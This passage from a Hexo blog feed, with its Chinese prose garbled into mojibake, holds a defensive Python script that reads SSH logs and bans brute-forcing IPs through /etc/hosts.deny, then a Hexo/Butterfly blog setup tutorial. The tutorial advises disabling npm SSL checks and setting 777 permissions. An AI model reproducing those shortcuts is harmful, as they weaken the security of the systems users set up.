class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import subprocess</span><br><span class="line">from multiprocessing import Process</span><br><span class="line"></span><br><span class="line">logFile = &#x27;/var/log/secure&#x27;     # å®‰å…¨æ—¥å¿—æ–‡ä»¶è·¯å¾„</span><br><span class="line">hostDeny = &#x27;/etc/hosts.deny&#x27;    # é»‘åå•æ–‡ä»¶è·¯å¾„</span><br><span class="line">password_wrong_num = 3      # å¯†ç é”™è¯¯æ¬¡æ•°é˜ˆå€¼</span><br><span class="line">unblock_time = 10 * 60 * 60  # è§£å°æ—¶é—´ï¼š10å°æ—¶</span><br><span class="line"></span><br><span class="line"># è·å–å·²ç»åŠ å…¥é»‘åå•çš„IPï¼Œè½¬æ¢ä¸ºå­—å…¸</span><br><span class="line">def getDenyIP():</span><br><span class="line">    denyDict = &#123;&#125;</span><br><span class="line">    with open(hostDeny, &#x27;r&#x27;) as file:  # ä½¿ç”¨withè¯­å¥ä»¥ç¡®ä¿æ–‡ä»¶åœ¨ä½¿ç”¨åè¢«æ­£ç¡®å…³é—­</span><br><span class="line">        for ip in file.readlines():</span><br><span class="line">            abnormal = re.search(r&#x27;(\d+\.\d+\.\d+\.\d+)&#x27;, ip)</span><br><span class="line">            if abnormal:</span><br><span class="line">                denyDict[abnormal.group(1)] = time.time()</span><br><span class="line">    return denyDict</span><br><span class="line"></span><br><span class="line"># ç›‘æ§æ–¹æ³•</span><br><span class="line">def monitorLog(logFile):</span><br><span class="line">    # ç»Ÿè®¡å¯†ç é”™è¯¯çš„æ¬¡æ•°</span><br><span class="line">    tempIP = &#123;&#125;</span><br><span class="line">    # è·å–å·²ç»è¿›å…¥é»‘åå•çš„IP</span><br><span class="line">    denyDict = getDenyIP()</span><br><span class="line">    # è¯»å–å®‰å…¨æ—¥å¿—</span><br><span class="line">    popen = subprocess.Popen(&#x27;tail -f &#x27; + logFile, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    # å¼€å§‹ç›‘æ§</span><br><span class="line">    print(&quot;------ SSHé˜²çˆ†ç ´è„šæœ¬å¼€å¯ ------&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        line = popen.stdout.readline().strip()</span><br><span class="line">        if line:</span><br><span class="line">            abnormal_invalid_user = re.search(&#x27;Invalid user \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">            abnormal_failed_password = re.search(&#x27;Failed password for \w+ from (\d+\.\d+\.\d+\.\d+)&#x27;, str(line))</span><br><span class="line">            if abnormal_invalid_user and not denyDict.get(abnormal_invalid_user.group(1)):</span><br><span class="line">                subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(abnormal_invalid_user.group(1), hostDeny))</span><br><span class="line">                denyDict[abnormal_invalid_user.group(1)] = time.time()</span><br><span class="line">                time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">                print(&#x27;&#123;&#125; --- ip:&#123;&#125; å› ä¸ºç™»é™†é”™è¯¯ç”¨æˆ·å è¢«æ‹‰å…¥é»‘åå•&#x27;.format(time_str, abnormal_invalid_user.group(1)))</span><br><span class="line">            elif abnormal_failed_password:</span><br><span class="line">                ip = abnormal_failed_password.group(1)</span><br><span class="line">                tempIP[ip] = tempIP.get(ip, 0) + 1</span><br><span class="line">                if tempIP[ip] &gt; password_wrong_num and not denyDict.get(ip):</span><br><span class="line">                    subprocess.getoutput(&#x27;echo \&#x27;sshd:&#123;&#125;\&#x27; &gt;&gt; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">                    denyDict[ip] = time.time()</span><br><span class="line">                    time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">                    print(&#x27;&#123;&#125; --- ip:&#123;&#125; å› ä¸ºå¯†ç é”™è¯¯æ¬¡æ•°è¶…è¿‡ä¸Šé™ è¢«æ‹‰å…¥é»‘åå•&#x27;.format(time_str, ip))</span><br><span class="line">        </span><br><span class="line">        # æ£€æŸ¥é»‘åå•ä¸­çš„IPåœ°å€æ˜¯å¦è¶…è¿‡è§£å°æ—¶é—´ï¼Œè‹¥è¶…è¿‡åˆ™è§£å°</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        for ip, start_time in list(denyDict.items()):  # ä½¿ç”¨list()å°†å­—å…¸é¡¹è½¬æ¢ä¸ºåˆ—è¡¨é¡¹ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹å­—å…¸å¤§å°</span><br><span class="line">            if end_time - start_time &gt; unblock_time:</span><br><span class="line">                subprocess.getoutput(&#x27;sed -i &quot;/^sshd:&#123;&#125;/d&quot; &#123;&#125;&#x27;.format(ip, hostDeny))</span><br><span class="line">                denyDict.pop(ip)  # ä½¿ç”¨ pop() æ–¹æ³•ä»å­—å…¸ä¸­å½»åº•åˆ é™¤æŒ‡å®šé”®å€¼å¯¹</span><br><span class="line">                time_str = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;, time.localtime(time.time()))</span><br><span class="line">                print(&#x27;&#123;&#125; --- ip:&#123;&#125; å·²ä»é»‘åå•ä¸­è§£å°&#x27;.format(time_str, ip))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    monitorLog(logFile)</span><br></pre></td></tr></table></figure><h2 id="å››ã€å°ç¦æ•ˆæœ"><a href="#å››ã€å°ç¦æ•ˆæœ" class="headerlink" title="å››ã€å°ç¦æ•ˆæœ"></a>å››ã€å°ç¦æ•ˆæœ</h2><p><img src="/img/Python-ssh-IPBan-Script/1.png" alt="1"></p><p><img src="/img/Python-ssh-IPBan-Script/2.png" alt="2"></p><p>å¦‚ä¸‹ï¼šIP192.168.31.50 è¢«å°ç¦sshæœåŠ¡<img src="/img/Python-ssh-IPBan-Script/3.png" alt="3"></p><p><img src="/img/Python-ssh-IPBan-Script/4.png" alt="4"></p><p>è¶…è¿‡è®¾å®šçš„æ—¶é—´å°†ä¼šè‡ªåŠ¨è§£é™¤å°ç¦ï¼š</p><p><img src="/img/Python-ssh-IPBan-Script/5.png" alt="5"></p>]]></content>
      
      
      <categories>
          
          <category> Pythonæ­¦å™¨åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonæ­¦å™¨åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å…¶ä»–ç»éªŒã€‘Hexo-Butterflyä¸ªäººåšå®¢æ­å»º</title>
      <link href="/2024/02/12/Extracurricular-experience-hexo-build/"/>
      <url>/2024/02/12/Extracurricular-experience-hexo-build/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡</h1><ol start="2"><li><p>å°†æˆ‘ä»¬çš„åšå®¢éƒ¨ç½²åˆ°windows æˆ– Linux å‡å¯ï¼Œæ‰€éœ€è¦çš„åŸºç¡€ç¯å¢ƒå¦‚ä¸‹ï¼ˆä¿è¯æ‰€æœ‰çš„-vå‡å¯æ­£å¸¸è¾“å‡ºå³å¯ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git -v</span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm -v</span><br><span class="line">cnpm install -g hexo-cli</span><br><span class="line">hexo -v</span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœcnpmé‚£é‡Œå‡ºé”™ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹è¿›è¡Œå®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   npm cache clean --force</span><br><span class="line">   npm install -g cnpm --registry=https://registry.npm.taobao.org --strict-ssl=false</span><br><span class="line">   æˆ–è€…ä½¿ç”¨å¦‚ä¸‹</span><br><span class="line">npm install --registr=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure><p>cnpmä»‹ç»ï¼šè·Ÿnpmæ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œä¸è¿‡ä½¿ç”¨çš„æ˜¯ä¸­å›½å¢ƒå†…çš„æºã€‚ä»¥ä¸‹ä½¿ç”¨npm çš„åœºæ™¯å‡å¯ç”¨cnpmä»£æ›¿ã€‚</p></li><li><p>æˆ‘ä»¬å¯ä»¥ç»™npmé…ç½®æˆå…¨å±€çš„taobaoåœ°å€</p><p>ç„¶åå†å»ä¸‹è½½cnpm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></li></ol><h1 id="äºŒã€æœ¬åœ°æ­å»º"><a href="#äºŒã€æœ¬åœ°æ­å»º" class="headerlink" title="äºŒã€æœ¬åœ°æ­å»º"></a>äºŒã€æœ¬åœ°æ­å»º</h1><p>ä½¿ç”¨Hexo æ¥æ­å»ºåšå®¢ï¼ˆæœ¬åœ°å¯åŠ¨ï¼‰</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€å…ˆæ‰¾ä¸€ä¸ªç©ºç™½æ–‡ä»¶å¤¹</span><br><span class="line"><span class="number">2</span>ã€åˆå§‹åŒ–åšå®¢ï¼šsudo hexo init</span><br><span class="line"><span class="number">3</span>ã€å¯åŠ¨åšå®¢ï¼šhexo sï¼ˆhexo server -p <span class="number">1314</span>ï¼‰</span><br><span class="line"><span class="number">4</span>ã€è®¿é—®åšå®¢ï¼š<span class="attr">http</span>:<span class="comment">//localhost:4000</span></span><br><span class="line"><span class="number">5</span>ã€åˆ›å»ºæ–°çš„åšå®¢æ–‡ç« ï¼šhexo n <span class="string">&quot;MyFirst-Blog&quot;</span></span><br><span class="line"><span class="number">6</span>ã€æ–°çš„åšå®¢æ–‡ç« åœ¨ä¸­æŸ¥çœ‹ï¼šcd source/_posts/</span><br><span class="line"><span class="number">7</span>ã€å‘ç°æ˜¯.<span class="property">md</span>æ–‡ç« ç»“æ„ï¼Œå¯ä»¥ç”¨<span class="title class_">Typora</span>è¿›è¡Œç¼–è¾‘ï¼ˆæˆ‘ä»¬åœ¨win11ä¸­å®‰è£…typoraç¼–è¾‘ï¼ŒåŒæ—¶è¿˜éœ€è¦åœ¨kaliä¸­ç»™åˆ°<span class="number">777</span>æƒé™ï¼‰</span><br><span class="line"><span class="number">8</span>ã€æ–‡ç« å†™å®Œä¹‹åæ¸…ç†ä¸‹ç¼“å­˜ï¼šhexo clean</span><br><span class="line"><span class="number">9</span>ã€é‡æ–°ç”Ÿæˆå’Œå¯åŠ¨ï¼šhexo gã€hexo s</span><br><span class="line"><span class="number">10</span>ã€é‡æ–°è®¿é—®ï¼š<span class="attr">http</span>:<span class="comment">//localhost:4000</span></span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€éƒ¨ç½²åˆ°è¿œç«¯ï¼ˆGithubï¼‰æˆ–-å…¶ä»–"><a href="#ä¸‰ã€éƒ¨ç½²åˆ°è¿œç«¯ï¼ˆGithubï¼‰æˆ–-å…¶ä»–" class="headerlink" title="ä¸‰ã€éƒ¨ç½²åˆ°è¿œç«¯ï¼ˆGithubï¼‰æˆ– å…¶ä»–"></a>ä¸‰ã€éƒ¨ç½²åˆ°è¿œç«¯ï¼ˆGithubï¼‰æˆ– <a href="https://blog.csdn.net/guixinchn/article/details/107787660">å…¶ä»–</a></h1><h2 id="1ã€éƒ¨ç½²åˆ°-Github"><a href="#1ã€éƒ¨ç½²åˆ°-Github" class="headerlink" title="1ã€éƒ¨ç½²åˆ° Github"></a>1ã€éƒ¨ç½²åˆ° Github</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ç™»å½•è‡ªå·±çš„ <span class="title class_">Github</span>ã€‚</span><br><span class="line"><span class="number">2.</span>æ–°å»ºä¸€ä¸ªä»“åº“ï¼š</span><br><span class="line">æ³¨æ„ä»“åº“çš„åç§°ï¼šä¸€å®šæ˜¯ä½ çš„æ˜µç§°.<span class="property">github</span>.<span class="property">io</span></span><br><span class="line">ä¾‹å¦‚æˆ‘çš„ <span class="title class_">Github</span> æ˜µç§°æ˜¯ qinghan586ï¼Œé‚£ä¹ˆä»“åº“åç§°è¾“å…¥ï¼šqinghan586.<span class="property">github</span>.<span class="property">io</span></span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-hexo-build/Untitled.png" alt="Untitled"></p><p><img src="/img/Extracurricular-experience-hexo-build/Untitled2.png" alt="Untitled2"></p><p>ç°åœ¨æ˜¯ä¸ªç©ºä»“åº“ï¼Œåœ°å€æ˜¯è¿™ä¸ªï¼Œå…ˆæ”¾ç€ã€‚</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>ç„¶åç”¨sshè¿æ¥github</span><br><span class="line"><span class="number">1</span>ã€å…ˆåœ¨æœ¬åœ°kaliç”Ÿæˆsshå¯†é’¥ï¼šssh-keygen -t rsa -C <span class="string">&quot;ä½ çš„é‚®ç®±&quot;</span></span><br><span class="line"><span class="number">2</span>ã€ä¹‹åæ‰¾åˆ°.<span class="property">ssh</span>æ–‡ä»¶å¤¹ä¸‹çš„id_rsa.<span class="property">pub</span>æ–‡ä»¶</span><br><span class="line"><span class="number">3</span>ã€å¤åˆ¶é‡Œé¢çš„å†…å®¹åˆ°githubä¸»é¡µçš„sshå¯†é’¥è®¾ç½®é‚£é‡Œã€‚éšæ„åå­—åŠ id_rsa.<span class="property">pub</span> å†…å®¹</span><br><span class="line"><span class="number">4</span>ã€æµ‹è¯•è¿æ¥ï¼šssh -T git@github.<span class="property">com</span>  # å‡ºç°<span class="title class_">Hi</span>ç”¨æˆ·åå³å¯</span><br></pre></td></tr></table></figure><p><strong><strong>ç»§ç»­åœ¨ blog ç›®å½•ä¸‹ï¼Œè¾“å…¥å‘½ä»¤è¡Œæ“ä½œï¼š</strong></strong></p><p>è£… Git éƒ¨ç½²çš„æ’ä»¶ï¼š<code>cnpm install --save hexo-deployer-git</code></p><p><img src="/img/Extracurricular-experience-hexo-build/Untitled3.png" alt="Untitled3"></p><p>é‡Œé¢çš„çº¢è‰²è­¦å‘Šå¯ä»¥å¿½ç•¥ä¸ç®¡ã€‚</p><p>å» blogæ ¹ç›®å½•ä¸‹ï¼Œä¿®æ”¹<code>_config.yml</code>å³å¯ã€‚æ³¨æ„ï¼š<code>blog</code>æ–‡ä»¶å¤¹ä¸‹çš„å…¶å®ƒæ–‡ä»¶ä¸‹ä¹Ÿæœ‰<code>_config.yml</code>æ–‡ä»¶ï¼Œåˆ«æ”¹é”™äº†æ–‡ä»¶ã€‚</p><p><strong><strong>æ–‡ä»¶çš„æœ€åº•éƒ¨ä¿®æ”¹æˆè¿™æ ·ï¼š</strong></strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy</span>:</span><br><span class="line">  <span class="attr">type</span>: git</span><br><span class="line">  <span class="attr">repo</span>: git@github.<span class="property">com</span>:<span class="title class_">Lusensec</span>/<span class="title class_">Lusensec</span>.<span class="property">github</span>.<span class="property">io</span>.<span class="property">git</span></span><br><span class="line">  <span class="attr">branch</span>: master # çœ‹è‡ªå·±çš„åšå®¢æ˜¯æ”¾åœ¨mainè¿˜æ˜¯masteråˆ†æ”¯</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šdeploy: type: repository: branch: åé¢éƒ½æœ‰ä¸€ä¸ªè‹±æ–‡çš„ç©ºæ ¼ã€‚</p><p>ç”¨ nopad++ä¿®æ”¹åä¸€å®šè¦ä¿å­˜ï¼</p><p>åˆ é™¤é™æ€æ–‡ç« ï¼š<code>hexo clear</code></p><p>æ¸…é™¤ç¼“å­˜ï¼š<code>hexo g</code></p><p>éƒ¨ç½²åˆ°è¿œç«¯ï¼š<code>hexo d</code></p><p>å¾€è¿œç«¯æ¨æˆåŠŸåï¼Œåˆ·æ–° Github ä»“åº“ï¼Œå‘ç°å¤šäº†å¾ˆå¤šä¸œè¥¿ï¼Œè¿™äº›å°±æ˜¯æˆ‘çš„åšå®¢å†…å®¹ï¼š</p><p>è®¿é—®<code>Lusensec.github.io</code>å°±å¯ä»¥ç›´æ¥æ‰“å¼€ï¼Œå¹¶çœ‹åˆ°åšå®¢éƒ¨ç½²åˆ° Github ä¸Šå»äº†ã€‚</p><p>å¦‚æœå¤±è´¥ï¼Œè¯·å¢åŠ å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &quot;è®¾ç½®çš„é‚®ç®±&quot;</span><br><span class="line">git config --global user.name &quot;ä½ çš„GitHubåç§°&quot;</span><br></pre></td></tr></table></figure><h2 id="2ã€GitHub-å’Œ-Gitee-åŒéƒ¨ç½²"><a href="#2ã€GitHub-å’Œ-Gitee-åŒéƒ¨ç½²" class="headerlink" title="2ã€GitHub å’Œ Gitee åŒéƒ¨ç½²"></a>2ã€GitHub å’Œ Gitee åŒéƒ¨ç½²</h2><p>æ ¹æ®ä½¬çš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/guixinchn/article/details/107787660">https://blog.csdn.net/guixinchn/article/details/107787660</a></p><p>åœ¨éƒ¨ç½²Githubä¹‹åå†è¿›è¡ŒGitee éƒ¨ç½²ï¼Œä¹‹åä¿®æ”¹<code>_config.yml</code>æ–‡ä»¶å³å¯å®ç°åŒéƒ¨ç½²ï¼š</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20240219160916193.png" alt="image-20240219160916193"></p><p>ä½†æ˜¯å¯¹äºGitee æ¥è¯´ï¼šæˆ‘ä»¬ä¸Šä¼ ä¹‹åéœ€è¦åœ¨ä»“åº“é¡µé¢çš„â€œæœåŠ¡â€ &gt; Gitee Pages &gt;  å‹¾é€‰â€œå¼ºåˆ¶ä½¿ç”¨HTTPSâ€  &gt; ç‚¹å‡»â€œå¯åŠ¨â€ è¿›è¡Œæ‰‹åŠ¨æ›´æ–°ã€‚æ‰‹åŠ¨æ›´æ–°å®Œæˆä¹‹åå†è®¿é—®ç½‘é¡µæ‰ä¼šæ›´æ–°ã€‚</p><h2 id="3ã€é…ç½®-Cloudflare-æ‰˜ç®¡åŠ é€Ÿè®¿é—®"><a href="#3ã€é…ç½®-Cloudflare-æ‰˜ç®¡åŠ é€Ÿè®¿é—®" class="headerlink" title="3ã€é…ç½® Cloudflare æ‰˜ç®¡åŠ é€Ÿè®¿é—®"></a>3ã€é…ç½® Cloudflare æ‰˜ç®¡åŠ é€Ÿè®¿é—®</h2><p>è¿›å…¥Cloudflareå®˜ç½‘æ³¨å†Œè´¦å·</p><p>è¿›å…¥<code>Workers å’Œ Pages</code>æ–°å»ºä¸€ä¸ª<code>Pages</code></p><p><img src="/img/Extracurricular-experience-hexo-build/16.jpg" alt="img"></p><p>ç‚¹å‡»<code>Connect to Git</code></p><p><img src="/img/Extracurricular-experience-hexo-build/17.jpg" alt="img"></p><p>ç‚¹å‡»<code>Begin setup</code></p><p><img src="/img/Extracurricular-experience-hexo-build/18.jpg" alt="img"></p><p>ç‚¹å‡»<code>Save and Deploy</code>è¿›è¡Œéƒ¨ç½²</p><p>éƒ¨ç½²æˆåŠŸå¯æŸ¥çœ‹å­åŸŸå</p><p><img src="/img/Extracurricular-experience-hexo-build/19.jpg" alt="img"></p><p>å¯é€šè¿‡<code>bileton-github-io.pages.dev</code>è¿›è¡Œè®¿é—®ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ä¸ºCloudflare ç»‘å®šä¸€ä¸ªè‡ªå®šä¹‰åŸŸåï¼ŒåŸŸåè´­ä¹°å’Œé…ç½®å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå¯¹äºå°ç™½æ¥è¯´å¾ˆåˆé€‚ï¼š<a href="https://www.oneyangcrown.top/posts/namesilo-domain-purchase-guide/">2025å¹´NameSiloåŸŸåè´­ä¹°ä¸ä½¿ç”¨å…¨æµç¨‹ - æ™šé˜³Crown</a></p><p>ç›®å‰è·³è¿‡è´­ä¹°é˜¶æ®µï¼Œè´­ä¹°ä¹‹åæˆ‘ä»¬å…ˆå…³é—­è‡ªåŠ¨ç»­è´¹åŠŸèƒ½</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20250602211233866.png" alt="image-20250602211233866"></p><p>åç»­ç»­è´¹åŒæ ·å¯ä»¥ä½¿ç”¨ 326145 çš„ä¼˜æƒ ç è¿›è¡Œä¼˜æƒ ã€‚</p><p>è¿›è¡ŒåŸŸåCloudflare æ‰˜ç®¡ã€‚</p><p><img src="/img/Extracurricular-experience-hexo-build/20250120151618258.png" alt="img"></p><p>è¾“å…¥åŸŸåå¹¶ç»§ç»­</p><p><img src="/img/Extracurricular-experience-hexo-build/20250120151752672.png" alt="img"></p><p>è®¡åˆ’é€‰æ‹©å…è´¹ç‰ˆï¼Œç‚¹ç»§ç»­ã€‚ä¹‹åå»åŸŸåæ§åˆ¶å°é…ç½® Cloudflare ç»™å‡ºçš„å†…å®¹</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20250602212533921.png" alt="image-20250602212533921"></p><p>åˆ é™¤Céƒ¨åˆ†å†…å®¹ï¼Œæ·»åŠ Béƒ¨åˆ†å†…å®¹</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20250602212804291.png" alt="image-20250602212804291"></p><p>æ”¹æˆå¦‚ä¸‹å†…å®¹</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20250602212924477.png" alt="image-20250602212924477"></p><p>å›åˆ°Cloudflareç‚¹å‡»ç»§ç»­ï¼Œä¹‹åç­‰å¾…é‚®ç®±ï¼Œå¤§æ¦‚5åˆ°10åˆ†é’Ÿçš„æ—¶é—´</p><p><img src="/img/Extracurricular-experience-hexo-build/image-20250602213052277.png" alt="image-20250602213052277"></p><p>å°±ä¿®æ”¹æˆåŠŸäº†ï¼Œåç»­é…ç½®å¦‚ä¸‹ï¼š<a href="https://zhuanlan.zhihu.com/p/22034763408">https://zhuanlan.zhihu.com/p/22034763408</a></p><h1 id="å››ã€å®‰è£…hexoçš„butterflyä¸»é¢˜"><a href="#å››ã€å®‰è£…hexoçš„butterflyä¸»é¢˜" class="headerlink" title="å››ã€å®‰è£…hexoçš„butterflyä¸»é¢˜"></a>å››ã€å®‰è£…hexoçš„butterflyä¸»é¢˜</h1><ol><li><p>å®‰è£…butterflyä¸»é¢˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹_config.yml</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme</span>: butterfly</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…æ’ä»¶</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure></li><li><p>è®¾ç½® _config.butterfly.yml</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å°† themes/butterfly/_config.<span class="property">yml</span> é‡å‘½åä¸º_config.<span class="property">butterfly</span>.<span class="property">yml</span> æ–‡ä»¶</span><br><span class="line">å†å°†å…¶å¤åˆ¶åˆ° åšå®¢ ç›®å½•ä¸‹</span><br><span class="line">å¹¶åˆ é™¤ _config.<span class="property">landscape</span>.<span class="property">yml</span> æ–‡ä»¶</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£… pug å’Œ stylus çš„æ¸²æŸ“å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure></li></ol><h1 id="äº”ã€butterflyä¸»é¢˜å…¶ä»–ç¾åŒ–"><a href="#äº”ã€butterflyä¸»é¢˜å…¶ä»–ç¾åŒ–" class="headerlink" title="äº”ã€butterflyä¸»é¢˜å…¶ä»–ç¾åŒ–"></a>äº”ã€butterflyä¸»é¢˜å…¶ä»–ç¾åŒ–</h1><h2 id="1ã€å…¶ä»–ç¾åŒ–ä¿®æ”¹"><a href="#1ã€å…¶ä»–ç¾åŒ–ä¿®æ”¹" class="headerlink" title="1ã€å…¶ä»–ç¾åŒ–ä¿®æ”¹"></a>1ã€å…¶ä»–ç¾åŒ–ä¿®æ”¹</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€ä¸»é¢˜è¯­è¨€ï¼šé»˜è®¤æ˜¯en</span><br><span class="line">æ”¯æŒ<span class="title function_">default</span>(en)ã€zh-<span class="title function_">CN</span>(ç®€ä½“ä¸­æ–‡)ã€zh-<span class="title function_">TW</span>(ç¹ä½“ä¸­æ–‡)</span><br><span class="line"><span class="number">2</span>ã€ç½‘ç«™èµ„æ–™ï¼š</span><br><span class="line">å¦‚æ ‡é¢˜ã€å‰¯æ ‡é¢˜ã€é‚®ç®±ç­‰ä¸ªäººèµ„æ–™åœ¨æ ¹ç›®å½•çš„ _config.<span class="property">yml</span></span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-hexo-build/Untitled4.png" alt="Untitled4"></p><h2 id="2ã€å¯¼èˆªèœå•"><a href="#2ã€å¯¼èˆªèœå•" class="headerlink" title="2ã€å¯¼èˆªèœå•"></a>2ã€å¯¼èˆªèœå•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">åœ¨_config.butterfly.yml æ–‡ä»¶ä¸­ï¼Œæœ€å¼€å§‹çš„ Menu ç›®å½•çš„ä½ç½®ï¼Œå°†menuä¸‹çš„æ³¨é‡Šæ‰“å¼€ï¼Œç¼©è¿›ä¸ºä¸¤æ ¼ã€‚</span><br><span class="line">æ ¼å¼ï¼šåå­—ï¼š è·¯å¾„ || å›¾æ ‡</span><br><span class="line">å¹¶ä¿®æ”¹æˆè‡ªå·±å¯¹åº”çš„ä¸œè¥¿ã€‚</span><br><span class="line">å¦‚ä¸‹æ‰€ç¤ºï¼šæ ‡ç­¾ï¼š/tags/ || fas fa-tags</span><br><span class="line"></span><br><span class="line">æ ‡ç­¾é¡µï¼š</span><br><span class="line">å‰å¾€ä½ çš„ Hexo åšå®¢çš„æ ¹ç›®éŒ„</span><br><span class="line">è¼¸å…¥ hexo new page 